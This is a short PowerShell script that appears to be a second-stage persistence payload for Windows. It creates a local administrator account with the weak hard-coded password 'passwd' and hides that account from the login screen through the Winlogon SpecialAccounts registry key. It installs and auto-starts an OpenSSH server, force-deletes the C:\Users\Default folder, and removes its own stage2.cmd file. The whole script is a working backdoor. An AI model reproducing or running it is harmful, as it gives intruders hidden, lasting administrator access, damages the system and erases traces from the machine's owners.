
$admin_name = "new_admin"
$passwd = (ConvertTo-SecureString "passwd" -AsPlainText -Force)

# creation of a temp admin
Remove-LocalUser -Name $admin_name

New-LocalUser "$admin_name" -Password $passwd -FullName "$admin_name" -Description "Temporary local admin"
Write-Verbose "$admin_name local user crated"
Add-LocalGroupMember -Group "Administrators" -Member "$admin_name"
Write-Verbose "$admin_name added to the local administrator group"

# clearing the new_admins_folder
Remove-Item -Force "C:\Users\Default"

# registry
$some_string = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$zeros = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $some_string -Name $admin_name -Value $zeros -PropertyType DWORD -Force

# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'


# del stage2.cmd
Remove-Item "./stage2.cmd"
